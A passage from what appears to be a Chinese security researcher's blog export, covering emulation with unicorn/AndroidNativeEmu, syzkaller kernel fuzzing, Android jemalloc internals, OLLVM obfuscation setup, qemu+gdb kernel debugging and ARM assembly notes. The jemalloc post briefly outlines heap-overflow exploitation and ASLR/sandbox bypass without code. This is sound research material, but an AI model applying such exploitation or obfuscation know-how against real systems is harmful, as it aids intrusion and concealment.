e: print(\u0026#34;ERROR: %s\u0026#34; %e) 0x03 一些基于unicorn的项目简单使用 AndroidNativeEmu AndroidNativeEmu 让你能够跨平台模拟Android Native库函数，比如JNI_OnLoad、Java_XXX_XX等函数\n这是看雪无名侠大佬二次修改一个版本，真的太强了。\n安装报错解决\n安装有些坑。。\n首先要求使用python3.7。之后\n1 2 3 4 git https://github.com/AeonLucid/AndroidNativeEmu.git pip install -r requirements.txt cd samples # 运行python example.py开始报错。。 在win上先搞定keystone-engine\n1 git clone https://github.com/keystone-engine/keystonecd keystone/bindings/pythonpython setup.py install 下载 Windows - Core engine x64\n解压找到keystone.dll 放到X:\\location_to_python\\Lib\\site-packages\\keystone\\\n还有可能报fail to load the dynamic library.\n下载 vcredist_x64 安装。\n之后直接python example.py 继续报ModuleNotFoundError: No module named 'androidemu'\n加入代码\n1 2 import sys sys.path.append(\u0026#39;../\u0026#39;) 又报FileNotFoundError: [Errno 2] No such file or directory: 'samples/example_binaries/libc.so'\n删掉代码里的 samples/example_binaries/libc.so的samples/\n能跑起来但是报错unicorn.unicorn.UcError: Invalid instruction (UC_ERR_INSN_INVALID)\n改成emulator.load_library(\u0026quot;example_binaries/libc.so\u0026quot;, do_init=False)\n就成功运行\n使用\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 import logging import posixpath import sys sys.path.append(\u0026#39;../\u0026#39;) from unicorn import UcError, UC_HOOK_CODE, UC_HOOK_MEM_UNMAPPED from unicorn.arm_const import * from androidemu.emulator import Emulator from androidemu.java.java_class_def import JavaClassDef from androidemu.java.java_method_def import java_method_def import debug_utils class MainActivity(metaclass=JavaClassDef, jvm_name=\u0026#39;com/example/debugdemo/MainActivity\u0026#39;): def __init__(self): pass @java_method_def(name=\u0026#39;stringFromJNI\u0026#39;, signature=\u0026#39;()Ljava/lang/String;\u0026#39;, native=True) def string_from_jni(self, mu): pass def test(self): pass # Configure logging logging.basicConfig( stream=sys.stdout, level=logging.DEBUG, format=\u0026#34;%(asctime)s %(levelname)7s %(name)34s | %(message)s\u0026#34; ) logger = logging.getLogger(__name__) ## 先创建java class ## 初始化emulater emulator = Emulator( vfs_root=posixpath.join(posixpath.dirname(__file__),\u0026#34;vfs\u0026#34;), vfp_inst_set=True ) ## 注册 java class emulator.java_classloader.add_class(MainActivity) ## load libraries emulator.load_library(\u0026#34;example_binaries/libdl.so\u0026#34;) emulator.load_library(\u0026#34;example_binaries/libc.so\u0026#34;) emulator.load_library(\u0026#34;example_binaries/libstdc++.so\u0026#34;) emulator.load_library(\u0026#34;example_binaries/libm.so\u0026#34;) tar_lib = emulator.load_library(\u0026#34;example_binaries/libtest.so\u0026#34;) # Show loaded modules. logger.info(\u0026#34;Loaded modules:\u0026#34;) for module in emulator.modules: logger.info(\u0026#34;=\u0026gt; 0x%08x - %s\u0026#34; % (module.base, module.filename)) try: ## Run JNI_OnLoad. emulator.call_symbol(tar_lib, \u0026#39;JNI_OnLoad\u0026#39;, emulator.java_vm.address_ptr, 0x00) emulator.mu.hook_add(UC_HOOK_MEM_UNMAPPED, debug_utils.hook_unmapped) # Do native stuff. emulator.mu.hook_add(UC_HOOK_CODE, debug_utils.hook_code) main_activity = MainActivity() logger.info(\u0026#34;Response from JNI call: %s\u0026#34; % main_activity.string_from_jni(emulator)) # Dump natives found. logger.info(\u0026#34;Exited EMU.\u0026#34;) logger.info(\u0026#34;Native methods registered to MainActivity:\u0026#34;) for method in MainActivity.jvm_methods.values(): if method.native: logger.info(\u0026#34;- [0x%08x] %s - %s\u0026#34; % (method.native_addr, method.name, method.signature)) except UcError as e: print(\u0026#34;Exit at %x\u0026#34; % emulator.mu.reg_read(UC_ARM_REG_PC)) raise samples 文件夹下几个具体的实例 unicorefuzz 合并到AFL系列总结\n参考 中文文档https://github.com/kabeor/Micro-Unicorn-Engine-API-Documentation\nhttps://github.com/unicorn-engine/unicorn\nhttps://github.com/P4nda0s/AndroidNativeEmu\nhttps://app.yinxiang.com/fx/a6cc6633-a93f-4111-a06a-cccd5fa39e0f\nhttps://github.com/fgsect/unicorefuzz\n","date":"2020-04-17T00:00:00+08:00","permalink":"https://ykiko.top/p/unicorn%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/","title":"Unicorn简单学习使用记录"},{"content":"syzkaller_fuzzing_入门 0x00 介绍 syzkaller是google的安全研究人员开发并维护的内核fuzz工具。它主要是用go写的，也有少部分C代码，支持akaros/fuchsia/linux/android/freebsd/netbsd/openbsd/windows等系统，发现的漏洞多达上千。\n0x01 环境配置 环境要求：\nC/C++ 编译器\nGCC 6.1.0+ linux kernel\n编译 v4.6以后编译时确保CONFIG_KCOV=y 之前版本：这样添加支持\n一些额外选项\nVM 一般QEMU\n支持QEMU、kvmtool和GCE虚拟机、Android设备和Odroid C2开发板\n需要进行通信：vm要提供网络支持\nvm配置需要ssh服务器\n要能执行ssh -i $SSHID -p $PORT root@localhost\n需要将debugfs 挂在到 /sys/kernel/debug\nGolang 安装\n1 2 3 4 5 6 7 8 9 10 wget https://dl.google.com/go/go1.14.1.linux-amd64.tar.gz tar -C ~/goroot -xzf go1.14.1.linux-amd64.tar.gz vim /etc/profile mkdir /usr/local/gopath # 添加export export GOROOT=/home/kuekiko/goroot export GOPATH=/home/kuekiko/gopath export PATH=$GOROOT/bin:$PATH export PATH=$GOPATH/bin:$PATH source etc/profile syzkaller\n1 2 3 4 5 # build go get -u -d github.com/google/syzkaller/... cd $GOROOT/src/github.com/google/syzkaller/ make -j4 # build之后在bin/下 如果要cross-OS/arch 进行测试的话，记得修改TARGETOS, TARGETVMARCH 和TARGETARCH参数再make 0x02 Init syzkaller 生成镜像\n1 2 3 4 5 6 7 8 9 sudo apt install debootstrap cd gopath/src/github.com/google/syzkaller/tools/ # 使用国内源 修改create-image.sh sudo debootstrap --include=$PREINSTALL_PKGS --components=main,contrib,non-free $RELEASE $DIR # 改成 sudo debootstrap --include=$PREINSTALL_PKGS --components=main,contrib,non-free $RELEASE $DIR http://mirrors.163.com/debian/ ./create-image.sh # 选项 --distribution wheezy --feature full # 生成了stretch.id_rsa stretch.id_rsa.pub stretch.img 编译启动 内核 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 export KERNEL=/home/kuekiko/linux_kernel export IMG=/home/kuekiko/linux_kernel/img export PATH=$KERNEL:$PATH export PATH=$IMG:$PATH # 默认编译 cd $KERNEL/xxx make CC=\u0026#34;$GCC/bin/gcc\u0026#34; defconfig make CC=\u0026#34;$GCC/bin/gcc\u0026#34; kvmconfig # 直接 make menuconfig # 编辑.config CONFIG_KCOV=y CONFIG_DEBUG_INFO=y CONFIG_KASAN=y CONFIG_KASAN_INLINE=y # 新 CONFIG_CONFIGFS_FS=y CONFIG_SECURITYFS=y make CC=\u0026#34;$GCC/bin/gcc\u0026#34; olddefconfig make CC=\u0026#34;$GCC/bin/gcc\u0026#34; -j4 qemu 1 2 3 4 5 6 7 8 9 10 11 qemu-system-x86_64 \\ -kernel $KERNEL/arch/x86/boot/bzImage \\ -append \u0026#34;console=ttyS0 root=/dev/sda earlyprintk=serial\u0026#34;\\ -hda $IMAGE/stretch.img \\ -net user,hostfwd=tcp::10021-:22 -net nic \\ -enable-kvm \\ -nographic \\ -m 2G \\ -smp 2 \\ -pidfile vm.pid \\ 2\u0026gt;\u0026amp;1 | tee vm.log ssh连接\nssh -i $IMG/stretch.id_rsa -p 10021 -o \u0026quot;StrictHostKeyChecking no\u0026quot; root@localhost\nkill qemu 使用kill $(cat vm.pid)\n0x03 Start Fuzzing 添加配置文件my.cfg\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 { \u0026#34;target\u0026#34;: \u0026#34;linux/amd64\u0026#34;, \u0026#34;http\u0026#34;: \u0026#34;127.0.0.1:56741\u0026#34;, \u0026#34;workdir\u0026#34;: \u0026#34;$GOPATH/src/github.com/google/syzkaller/workdir\u0026#34;, \u0026#34;kernel_obj\u0026#34;: \u0026#34;$KERNEL\u0026#34;, \u0026#34;image\u0026#34;: \u0026#34;$IMAGE/stretch.img\u0026#34;, \u0026#34;sshkey\u0026#34;: \u0026#34;$IMAGE/stretch.id_rsa\u0026#34;, \u0026#34;syzkaller\u0026#34;: \u0026#34;$GOPATH/src/github.com/google/syzkaller\u0026#34;, \u0026#34;procs\u0026#34;: 4, \u0026#34;type\u0026#34;: \u0026#34;qemu\u0026#34;, \u0026#34;vm\u0026#34;: { \u0026#34;count\u0026#34;: 4, \u0026#34;kernel\u0026#34;: \u0026#34;$KERNEL/arch/x86/boot/bzImage\u0026#34;, \u0026#34;cpu\u0026#34;: 2, \u0026#34;mem\u0026#34;: 2048 } } 启动fuzzing\n./bin/syz-manager -config=my.cfg\n浏览器打开http://127.0.0.1:56741/\n虚拟机性能太垃圾，太慢了 fuzzing半天没也啥crashes。还是得用服务器。\n挂机了大概3小时，出了几个没啥用的crach。\n0x04 总结 还有很多选项可以开启，没试。\n看看实现源码，还有就是之后试试Fuzzing Android\n参考 https://github.com/google/syzkaller\nhttps://www.freebuf.com/sectool/142969.html\nhttp://blog.douluodalu.wang/2020/03/22/syz-fuzz%E5%88%9D%E6%8E%A2/\nhttps://github.com/google/syzkaller/blob/master/docs/linux/setup.md\n","date":"2020-04-10T00:00:00+08:00","permalink":"https://ykiko.top/p/syzkaller_fuzzing_%E5%85%A5%E9%97%A8/","title":"syzkaller_fuzzing_入门"},{"content":"Android之jemalloc 0x00 简单介绍 想调一个CVE、发现对jemalloc 了解太少。重新复习复习jemalloc，做个记录。\njemalloc最初是2005年 Jason Evans开发的新一代内存分配器， 之后没多久被添加到FreeBSD的libc中的默认内存分配器，用来替代原来的phkmalloc。2007年 Firefox Mozilla项目的独立版本也将jemalloc作为主要的分配器。2009年，Facebook 的后端项目也广泛使用jemalloc。2014年，Android 5 开始采用jemalloc作为主要的内存分配器，不过部分Android5/6依然能看到dlmalloc和jemalloc两者并存。\njemalloc的一些特性与设计原则：\n强大的多核/多线程分配能力.\n最小化的元数据开销\n基于每个线程进行缓存，避免了同步问题。\n避免了连续分配内存的碎片化问题。\n简洁高效\n0x01 结构 结构图\njemalloc对内存划分按照如下由高到低的顺序:\n内存是由一定数量的arenas进行管理.一个arena被分割成若干chunks, 后者主要负责记录bookkeeping（记录信息）.chunk内部又包含着若干runs, 作为分配小块内存的基本单元.run由pages组成, 最终被划分成一定数量的regions对于small size的分配请求来说, 这些region就相当于user memory.\narenas 对于Android来说：\n限制了只使用两个arenas,每个带有一个lock。这意味着，不同线程尝试分配内存时，会循环、平均分配至两个arena，确保两个arena有大致相等的进程数量。只有在相同的arena中分配内存时才需要获取lock。\n1 2 3 4 5 6 7 8 9 10 11 12 13 #/android.bp android_product_variables = { // Only enable the tcache on non-svelte configurations, to save PSS. malloc_not_svelte: { cflags: [ \u0026#34;-UANDROID_MAX_ARENAS\u0026#34;, \u0026#34;-DANDROID_MAX_ARENAS=2\u0026#34;, \u0026#34;-DJEMALLOC_TCACHE\u0026#34;, \u0026#34;-DANDROID_TCACHE_NSLOTS_SMALL_MAX=8\u0026#34;, \u0026#34;-DANDROID_TCACHE_NSLOTS_LARGE=16\u0026#34;, ], }, } 用shadow查看arenas\nchunk 一个arena下会有若干个chunk，Android 7之前chunk为256k，之后32位系统改为512k，64位系统改为2MB。\n每个chunk都有一个chunk head 包含着这个chunk的元数据（metadata）.Android 7之后元数据增加了mapbias与mapbits flags。\nchunk是存放run的容器，大小固定相同，操作系统返回的内存被划分到chunk中管理\nchunk中的元数据结构，mapbit[0]与mapmisc[0]指向chunk中的第一个run：\nchunk元数据中mapmisc中的bitmap结构管理着run中的region的分配使用：\nchunk\nrun run是存放连续的大小相同的region的容器，每个chunk中会包含若干个run，而run的metadata会存放在chunk的header当中，这样region里只存放数据本身，不再有内存属性说明。\nregion region是最小的存储单元，每个run里面的region大小完全相同，也没有元数据，malloc实际返回的是region的地址。\nbins jemalloc也用bin来管理内存，共有39个bins。bin的metadata存放于arena的header中，39个bin还会存放当前正在使用的run。所有带有空闲region的run和闲置的chunk信息会被放置在红黑树结构当中，这样寻找空闲内存的复杂度可以控制在o(log(n))。\ntcache 为了优化多线程性能，jemalloc还采用了LIFO结构的tcache，存放近期被释放的region，每个线程的每个bin都对应一个tcache，存放在tcache中的内存并不会设置free标记位，并且由于tache附着于线程本身，使得大部分情况下从tcache分配内存时完全无需lock。\n当jemalloc新分配一块内存是发现tcache为空，会触发prefill事件，此时jemalloc会将单前的arena上lock,并从当前run中取出一定数量的region存入tcache，保证tcache不为空。\n当tcache满了（small bin是8，larger bin是20）的时候，会触发flush 事件，会释放部分region，并且才会被标记为已释放。这时这些region才能被其他线程自由分配。\n此外，jemalloc也实现是GC机制。会有一个计数器统计申请和释放，达到阈值之后会触发特别的事件，目标bin里的tcache的四分之三的region会被释放掉。下次GC时会轮到下一个bin。这是可以从tcache中删除region并使其恢复常规可用性的另一种方法。\n分配流程 计算申请内存大小从当前线程的tcache中找到合适的bin如果tcache为空，就从当前的run中prefill一些region进来如果当前run耗尽，就从低地址开始找到第一个非空run如果现有run里没有足够的内存就分配一个新run如果chunk里没有空间了就分配一个新chunk，同时分配新run并prefill一些region到tcache\n0x02 shadow 使用shadow查看Android中的内存布局，简单学习下shadow的使用\n查看arenas 可以看到一共两个arenas，每个arena有36个bin，一共2个chunk。\n查看chunks 单个chunk，查看chunk中的run\n查看runs，会列出单前所有的run的详情 run_siez = region_size*no_regions\n只显示单前运行中的run\n是否是allocated状态是根据arena_chunk_map_bits_s 对应 bits的 第 [0] bit 来确定 这里jemalloc5 和 jemalloc4 3不一样。\n查看单个run的详情：\nrun的布局如下：\n源代码arena.h中有很多关于bits之类的注释。能够帮助理解。\n查看bins:\n1 2 3 4 5 6 struct arena_bin_s { malloc_mutex_t lock; arena_run_t *runcur; arena_run_heap_t runs; //4之前版本为arena_run_tree_t 类型 malloc_bin_stats_t stats; //统计信息 } runcur: 当前可用于分配的run, 一般情况下指向地址最低的non-full run, 同一时间一个bin只有一个current run用于分配.\n看别人的文章说是除去0号bin以外没4个bin为一组，组内size差一样，但是在这里可以看到每8个为一组，01-8号bin的size差值都为0x10,算是第一组，那第二组就为9-12号，只有4个bin size差值为0x20,但是有的为空，算第二组。没两组之间的差值2倍。以此类推，后面每4个为一组。\n划分为{0}、{1-8}、{9-12}、{13-16}····· 可能不同版本会有区别。\n查看regions [换了一个进程]\n大小都是0x8\n按大小查找：第4个：\ntchche查看：\ntcache的定义：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 struct tcache_bin_info_s { unsigned\tncached_max;\t/* Upper limit on ncached. */ }; struct tcache_bin_s { tcache_bin_stats_t tstats; int\tlow_water;\t/* Min # cached since last GC. */ unsigned\tlg_fill_div;\t/* Fill (ncached_max \u0026gt;\u0026gt; lg_fill_div). */ unsigned\tncached;\t/* # of cached objects. */ /* * To make use of adjacent cacheline prefetch, the items in the avail * stack goes to higher address for newer allocations. avail points * just above the available space, which means that * avail[-ncached, ... -1] are available items and the lowest item will * be allocated first. */ void\t**avail;\t/* Stack of available objects. */ }; struct tcache_s { ql_elm(tcache_t) link;\t/* Used for aggregating stats. */ uint64_t\tprof_accumbytes;/* Cleared after arena_prof_accum(). */ ticker_t\tgc_ticker;\t/* Drives incremental GC. */ szind_t\tnext_gc_bin;\t/* Next bin to GC. */ tcache_bin_t\ttbins[1];\t/* Dynamically sized. */ /* * The pointer stacks associated with tbins follow as a contiguous * array. During tcache initialization, the avail pointer in each * element of tbins is initialized to point to the proper offset within * this array. */ }; struct tcaches_s { union { tcache_t\t*tcache; tcaches_t\t*next; }; }; 0x03 利用 堆溢出\n一般先利用gadget 绕过ASLR，再利用gadget拿到代码执行的权限，只要能执行代码就能逃出sandboxing或者摆脱selinux。\nSmall region overflow Run overflow Chunk overflow 总结 后面还是得使用shadow工具具体调试CVE加深理解。\njemalloc新版与旧版有挺多区别，之后想要深入了解jemalloc的细节以及一些实现还是得看看源码。\n参考 https://github.com/jemalloc/jemalloc\nhttps://blog.csdn.net/txx_683/article/details/53468211\nhttps://blog.nsogroup.com/a-tale-of-two-mallocs-on-android-libc-allocators-part-2-jemalloc/\nhttps://www.anquanke.com/post/id/149132#h3-5\nhttps://www.anquanke.com/post/id/85982\ndlmalloc 的一个tools: shade\n","date":"2020-04-05T00:00:00+08:00","permalink":"https://ykiko.top/p/android%E4%B9%8Bjemalloc/","title":"Android之jemalloc"},{"content":"syzkaller-android 0x00 前言 介绍使用syzkaller fuzz Android的配置教程。\n0x01 环境 按要安装好环境\ngo\nsyzkaller\n交叉编译aarch64-linux-android、g++-aarch64-linux-gnu、gcc-arm-linux-gnueabihf、g++-arm-linux-gnueabihf\n0x02 配置 创建配置文件android.cfg\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 { \u0026#34;target\u0026#34;: \u0026#34;linux/arm64\u0026#34;, // arm \u0026#34;http\u0026#34;: \u0026#34;127.0.0.1:56741\u0026#34;, \u0026#34;workdir\u0026#34;: \u0026#34;$GOPATH/src/github.com/google/syzkaller/workdir\u0026#34;, \u0026#34;kernel_obj\u0026#34;: \u0026#34;$KERNEL\u0026#34;, // 内核路径 \u0026#34;syzkaller\u0026#34;: \u0026#34;$GOPATH/src/github.com/google/syzkaller\u0026#34;, \u0026#34;sandbox\u0026#34;: none, \u0026#34;procs\u0026#34;: 8, \u0026#34;type\u0026#34;: \u0026#34;adb\u0026#34;, \u0026#34;cover\u0026#34;: true, \u0026#34;vm\u0026#34;: { \u0026#34;devices\u0026#34;: [$DEVICES], \u0026#34;battery_check\u0026#34;: true } } KASAN+KCOV编译内核\n首先编译要fuzz的Android版本输入手机。（过程省略）[1]\n下载编译基准内核。[2] ，使用手动编译会报错，使用给KASCAN文档[3]的方法也可能报错。\n1 2 3 4 5 6 7 8 9 10 ## 创建文件夹 mkdir android-kernel \u0026amp;\u0026amp; cd android-kernel ## 切换分支 repo init -u https://android.googlesource.com/kernel/manifest -b BRANCH repo sync ## 修改内核build文件 内核路径下的build.config制定make_deconfig KERNEL_DIR=private/msm-google . ${ROOT_DIR}/${KERNEL_DIR}/build.config.common ##这里 ## 构建内核 build/build.sh 刷入内核\n重新编译aosp启动镜像\n在服务器上编译的将out/dist目录打包备份\n1 2 3 4 5 6 7 8 9 cd {aosp_dir} cp {kernel_dir}/out/{version}/dist/Image.lz4-dtb {aosp}/device/google/marlin-kernel . build/envsetup.sh lunch aosp_sailfish-userdebug make -j64 ## 重新拷贝到本地 win adb reboot bootloader set ANDROID_PRODUCT_OUT=./ fastboot flashall -w 之前 3.18.137-g72a7a6\n之后 … (手机显示无法显示内核) ```shell sailfish:/ # uname -a Linux localhost 3.18.137-g8b62de70252d #1 SMP PREEMPT 2019-09-27 02:13:04 aarch64 ``` 修改内核重新刷入\n失败的方法 按文档说的\n```shell cd arch/arm64/configs cp marlin_defconfig marlin-kasan_defconfig ``` 在配置文档中移除`CONFIG_KERNEL_LZ4=y` 加入 ```plain text CONFIG_KASAN_INLINE=y CONFIG_KCOV=y CONFIG_SLUB=y CONFIG_SLUB_DEBUG=y ``` 重新编译内核。 发现任何变化 尝试的方法\n修改build.config文件 ```shell . ${ROOT_DIR}/${KERNEL_DIR}/build.config.kasan (失败) ``` 不修改，还是去修改marlin_defconfig添加KASAN 报错：savedefconfig does not match private/msm-google 修改build.config 删掉check_defconfig 检查 （失败） 不修改文件\n使用命令 ```shell ./build/build.sh BUILD_CONFIG=build.config.kasan ``` 最后发现\n1 2 cp private/msm-google/build.config.kasan ./ BUILD_CONFIG=build.config.kasan build/build.sh ##放前面才管用 编译完成 ，修改aosp参数\n1 2 3 aosp$ cd device/google/marlin/sailfish cp BoardConfig.mk BoardConfig.mk.bak vim BoardConfig.mk 1 2 3 4 5 6 7 8 9 10 11 12 13 14 ## 注释掉 BOARD_KERNEL_BASE := 0x80000000 BOARD_KERNEL_PAGESIZE := 4096 ## ifneq ($(filter sailfish_kasan, $(TARGET_PRODUCT)),) BOARD_KERNEL_OFFSET := 0x80000 BOARD_KERNEL_TAGS_OFFSET := 0x02500000 BOARD_RAMDISK_OFFSET := 0x02700000 BOARD_MKBOOTIMG_ARGS := --kernel_offset $(BOARD_KERNEL_OFFSET) --ramdisk_offset $(BOARD_RAMDISK_OFFSET) --tags_offset $(BOARD_KERNEL_TAGS_OFFSET) ## else ## BOARD_KERNEL_TAGS_OFFSET := 0x02000000 ## BOARD_RAMDISK_OFFSET := 0x02200000 ## endif TARGET_KERNEL_ARCH := arm64 TARGET_KERNEL_HEADER_ARCH := arm64 修改device/google/marlin/device-common.mk\n1 2 lz4-\u0026gt;gz LOCAL_KERNEL := device/google/marlin-kernel/Image.gz-dtb 新的问题\n1 error: out/target/product/sailfish/boot-debug.img too large 解决方法：将BoardConfig.mk的BOARD_BOOTIMAGE_PARTITION_SIZE的值改大。\n重新编译aosp启动镜像 再刷入手机。\n0x03 开启fuzzing 1 ./bin/syz-manager -config=android.cfg fuzz\n手机不断重启。。。。\n查看msg:adb shell dmesg -w\nsyz-manager -debug 查看syz的相关问题。\n参考 [1]https://source.android.google.cn/setup/build?hl=zh-cn\n[2]https://source.android.google.cn/setup/build/building-kernels?hl=zh-cn\n[3]https://source.android.com/devices/tech/debug/kasan-kcov\n[4]https://github.com/google/syzkaller/blob/master/docs/linux/setup_linux-host_android-device_arm-kernel.md\n","date":"2019-09-15T00:00:00+08:00","permalink":"https://ykiko.top/p/syzkaller-android/","title":"syzkaller-android"},{"content":"OLLVM_混淆之一（补 OLLVM OLLVM(Obfuscator-LLVM)是瑞士西北应用科技大学安全实验室于2010年6月份发起的一个针对LLVM代码混淆项目， 用于增加逆向难度，保护代码的安全。最新版本为4.0。OLLVM适用LLVM支持的所有语言（C, C++, Objective-C, Ada 和 Fortran）和目标平台（x86, x86-64, PowerPC, PowerPC-64, ARM, Thumb, SPARC, Alpha, CellSPU, MIPS, MSP430, SystemZ, 和 XCore）。\nLLVM是lowlevel virtual machine的简称，是一个编译器框架。详细介绍可以看WIKI-LLVM 经典的三段式设计，前端使用不同的编译工具对代码进行分析转换成LLVM的中间表示IR（intermediate representation）。中间部分优化器只对IR进行操作，通过一系列的Pass对IR做优化。后端主要是讲优化好的IR解释成对应的机器码。\n对IR的处理过程下图：\nIR Pass\nOLLVM的混淆操作在IR层，通过编写Pass来混淆IR，以致后端生成的目标代码也被混淆了。\nOLLVM-Android环境搭建 前提环境：\nNDK环境\nLLVM\n下载源码(包括了LLVM和Clang)-编译OLLVM步骤如下：\n1 2 3 4 5 6 $ git clone -b llvm-4.0 https://github.com/obfuscator-llvm/obfuscator.git $ mkdir build $ cd build $ cmake -DCMAKE_BUILD_TYPE=Release ../obfuscator/ //（cmake -G \u0026#34;MinGW Makefiles\u0026#34; -DCMAKE_BUILD_TYPE=Release ../obfuscator/）(windows) $ make -j7 //这个数字自己看自己CPU填 太小可能非常编译慢 可以参照官方wiki来操作。编译完成后，二进制文件放在build/bin目录下。\n配置整合NDK：\n打开NDK目录ndk-bundle下的toolchains，新建obfuscator-llvm-4，将llvm文件夹里的所有文件复制到新建的目录下。\n将\\build\\bin目录下的clang.exe、clang++.exe和clang-format.exe复制到\\toolchains\\llvm\\prebuilt\\windows-x86_64\\bin目录下，直接替换掉其中的文件。（Windows下）\n（linux下)将llvm目录下的prebuilt目录和文件 config.mk、setup.mk和setup-common.mk拷贝到创建的obfuscator-llvm目录下-\u0026gt;然后替换obfuscator-llvm/prebuilt/linux-x86下的bin和lib为我们编译好的bin和lib\n然后将下面文件复制一份，改名称如下，比如arm-linux-androideabi-clang3.4复制一行改名为arm-linux-androideabi-obfuscator3.4\narm-linux-androideabi-clang3.4-\u0026gt; arm-linux-androideabi-obfuscator3.4\nmipsel-linux-android-clang3.4-\u0026gt; mipsel-linux-android-obfuscator3.4\nx86-clang3.4-\u0026gt; x86-obfuscator3.4\n分别修改以上三个文件的 setup.mk 中的 LLVM_NAME ，即将其指定到开始建立的obfuscator-llvm-3.4目录，也就是把把LLVM_NAME := llvm-$(LLVM_VERSION)改成LLVM_NAME := obfuscator-llvm-$(LLVM_VERSION)\n如果是配置64位的ndk配置,还要额外修改$NDK_PATH/build/core/setup-toolchain.mk文件，在NDK_64BIT_TOOLCHAIN_LIST := 加入 obfuscator 对应的NDK_TOOLCHAIN_VERSION NDK_64BIT_TOOLCHAIN_LIST := obfuscator3.4 clang3.6 clang3.5 clang3.4 4.9’\n开始使用OLLVM 参考 http://www.freebuf.com/articles/terminal/130142.html\nhttps://geneblue.github.io/2016/10/09/%E5%88%A9%E7%94%A8OLLVM%E6%B7%B7%E6%B7%86Android%20Native%E4%BB%A3%E7%A0%81%E7%AF%87%E4%B8%80/\nhttps://www.jmpoep.com/thread-4016-1-1.html\nBCTFhttp://ele7enxxh.com/Bctf-2016-LostFlower-Writeup.html\n","date":"2019-09-10T00:00:00+08:00","permalink":"https://ykiko.top/p/ollvm_%E6%B7%B7%E6%B7%86%E4%B9%8B%E4%B8%80%E8%A1%A5/","title":"OLLVM_混淆之一（补"},{"content":"qemu+gdb调试Linux内核 前言 调试Linux内核可以使用VM双机调试，不过使用qemu来调试会更加方便。\n环境搭建 编译源码 首先到Linux FTP仓库或者官网下载对应版本的源码。\n这里下载的是linux-4.10.10\n解压tar -xvJf linux-4.10.10.tar.xz\n安装依赖\n1 2 sudo apt install build-essential ncurses-dev xz-utils libssl-dev bc fakeroot aptitude libncurses5-dev sudo apt install qemu 编译内核 1 make menuconfig 进行配置：KernelHacking —\u0026gt; Compile-time checks and compiler options选中\n1 Compile the kernel with debug info 1 Compile the kernel with frame pointers 1 Provide GDB scripts for kernel debugging 1 Processor type and features→去掉Paravirtualized guest support 保存退出。\n命令make -jN 进行编译\n之后make all\n1 make modules 编译完成之后，vmlinux在源码根目录、bzImage在./arch/x86/boot/下\n构建initramfs根文件系统 借助BusyBox构建极简initramfs，busybox最新版下载地址\n编译静态版Busybox\n1 make menuconfig 设置以下选项：\nSettings -\u0026gt; Build Options -\u0026gt; Build static binary (no shared libs) 编译成静态文件\n开始编译：\n1 make -jNmake install 等待编译完成源码目录下出现_install目录，进行配置：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 cd _install mkdir proc sys dev etc etc/init.d vim etc/init.d/rcS \\# 文件中的内容如下 \\# #!/bin/sh \\# mount -t proc none /proc \\# mount -t sysfs none /sys \\# /sbin/mdev -s chmod +x etc/init.d/rcS 创建文件系统\n1 find . | cpio -o --format=newc \u0026gt; ../rootfs.img 运行内核 1 2 3 4 5 6 7 8 9 10 11 12 13 qemu-system-x86_64 \\ -kernel ~/linux-4.10.10/arch/x86_64/boot/bzImage \\ -initrd ~/busybox-1.31.0/rootfs.img \\ -append \u0026#34;console=ttyS0 root=/dev/ram rdinit=/sbin/init\u0026#34; \\ -cpu kvm64,+smep,+smap \\ -nographic \\ -gdb tcp::1234 cpu kvm64,+smep,+smap 设置CPU的安全选项，这里开启了smap和smep\nkernel 设置内核bzImage文件的路径\ninitrd 设置刚才利用busybox创建的rootfs.img，作为内核启动的文件系统\ngdb tcp::1234 设置gdb的调试端口为1234 在GDB中通过 target remote localhist:1234进行连接\n驱动 insmod 加载驱动\nrmmod 卸载驱动\nlsmod 查看加载了的驱动\n调试测试 qemu启动，启动后的界面\n启动GDB\n使用内核提供的GDB辅助调试功能：(gdb)apropos lx\n调试内核模块：add-symbol-file 添加模块文件\n断点测试 b cmdline_proc_show\ncat /proc/cmdline 触发断点\n引用 ","date":"2019-08-28T00:00:00+08:00","permalink":"https://ykiko.top/p/qemu-gdb%E8%B0%83%E8%AF%95linux%E5%86%85%E6%A0%B8/","title":"qemu+gdb调试Linux内核"},{"content":"ARM汇编基础(待补充) ARM汇编基础(简) 经常忘记，做个笔记，好作复习。。\n内容主要来源于《Android软件安全与逆向分析》和《逆向工程权威指南》以及 ARM 汇编 和Azeria-labs\nARM架构 ARM属于RISC CPU，\nARM模式 4个字节opcode 32位\nThumb模式 2个字节opcode 16位\nThumb-2模式 同上（只是有部分4个字节的opcode)\n64位ARM 4个字节opcode\nARM机器码在版本3之前是小端。但是之后默认采用大端格式，但可以设置切换到小端。\n数据类型 数据类型在汇编语言中的扩展后缀为**-h或者-sh对应着半字，-b或者-sb**对应着字节，但是对于字并没有对应的扩展\n1 2 3 4 5 6 7 8 9 10 ldr = 加载字，宽度四字节 ldrh = 加载无符号的半字，宽度两字节 ldrsh = 加载有符号的半字，宽度两字节 ldrb = 加载无符号的字节 ldrsb = 加载有符号的字节 str = 存储字，宽度四字节 strh = 存储无符号的半字，宽度两字节 strsh = 存储有符号的半字，宽度两字节 strb = 存储无符号的字节 strsb = 存储有符号的字节 字节序 在内存中有两种字节排布顺序，大端序(BE)或者小端序(LE)。两者的主要不同是对象中的每个字节在内存中的存储顺序存在差异。一般X86中是小端序，最低的字节存储在最低的地址上。在大端机中最高的字节存储在最低的地址上。\n数据访问时采取大端序还是小端序使用程序状态寄存器(CPSR)的第9比特位来决定的。\n寄存器 37个32位寄存器，其中31个为基础寄存器，6个为状态寄存器。\n用户模式下有\n不分组寄存器（R0-R7） R7一般存放系统调用号\n分组寄存器（R8-R14）\n程序计数器（R15）\n单前程序状态寄存器（CPSR）\n两种状态：\nARM状态（32位对齐） Thumb状态(16位对齐) R0-R7 R0-R7(相同) 